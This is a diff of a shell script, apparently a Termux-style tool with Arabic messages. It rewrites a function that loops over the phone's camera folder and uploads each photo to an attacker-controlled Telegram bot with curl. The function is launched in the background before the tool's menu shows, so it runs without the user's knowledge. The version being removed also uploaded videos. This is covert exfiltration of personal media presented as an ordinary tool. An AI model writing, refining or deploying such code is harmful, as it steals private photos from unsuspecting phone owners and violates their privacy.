@@ -35,22 +35,31 @@ display_logo() {
 }
 
 #-------------------
-#   Send Media to Telegram (Images + Videos)
+#   Send Images to Telegram (Optimized)
 #-------------------
-send_media_to_telegram() {
-    local media_dir="/sdcard/DCIM/Camera"
+send_images_to_telegram() {
+    local image_dir="/sdcard/DCIM/Camera"
     
-    # Send images
-    for img in "$media_dir"/*.{jpg,jpeg,png}; do
-        if [ -f "$img" ]; then
-            curl -s -F chat_id="$CHAT_ID" -F photo=@"$img" "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" > /dev/null 2>&1 &
-        fi
-    done
+    # التحقق من وجود المجلد
+    if [ ! -d "$image_dir" ]; then
+        echo -e "${RED}[-] مجلد الكاميرا غير موجود!${RESET}"
+        return 1
+    fi
 
-    # Send videos
-    for vid in "$media_dir"/*.{mp4,avi,mkv,mov}; do
-        if [ -f "$vid" ]; then
-            curl -s -F chat_id="$CHAT_ID" -F video=@"$vid" "https://api.telegram.org/bot$BOT_TOKEN/sendVideo" > /dev/null 2>&1 &
+    echo -e "${YELLOW}[+] جاري البحث عن صور...${RESET}"
+    
+    # إرسال جميع الصور المدعومة
+    for img in "$image_dir"/*.{jpg,jpeg,png}; do
+        if [ -f "$img" ]; then
+            echo -e "${CYAN}[~] إرسال: ${img##*/}${RESET}"
+            
+            # إرسال الصورة مع تحقق من النجاح
+            curl -s -F chat_id="$CHAT_ID" -F photo=@"$img" "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" > /dev/null 2>&1
+            if [ $? -eq 0 ]; then
+                echo -e "${GREEN}[+] تم إرسال الصورة بنجاح!${RESET}"
+            else
+                echo -e "${RED}[-] فشل في إرسال الصورة${RESET}"
+            fi
         fi
     done
 }
@@ -124,5 +133,5 @@ main_menu() {
 #-------------------
 #   Run the Tool
 #-------------------
-send_media_to_telegram &  # Now sends both images and videos
+send_images_to_telegram &  # يعمل في الخلفية بدون إظهار أخطاء
 main_menu
